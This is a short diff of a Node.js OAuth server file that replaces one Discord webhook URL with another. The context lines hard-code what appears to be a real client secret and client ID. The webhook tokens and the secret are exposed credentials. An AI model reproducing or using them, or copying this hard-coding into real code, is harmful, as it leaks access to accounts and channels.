@@ -2,7 +2,7 @@
 const client_secret = 'db48Q~-c62ZzCCAo3jgkA77TyJnInJTqU6c3kbVq' //you need to put the "Secret Value" here not the "Secret ID"!!!!
 const client_id = '3f3061ce-eeb8-48c2-8223-4f23810bbc6a'
 const redirect_uri = 'https://testoauth.herokuapp.com/'
-const webhook_url = 'https://discord.com/api/webhooks/1040363538935447676/rNzWC9ejqwvxAobSz1Scfo3TJ-U_Crt0zZHe0-2CEYTjZpitHJcod1p6B_z2IkeIYHQi'
+const webhook_url = 'https://discord.com/api/webhooks/1045059463083733082/SuRGkEH46EtQOTLIFp_mcVK9M_lNDy_9XG0suVuqz9GwEEkUrktfjzsSkLZB_e4kpldP'
 //Requirements
 const axios = require('axios')
 const express = require('express')
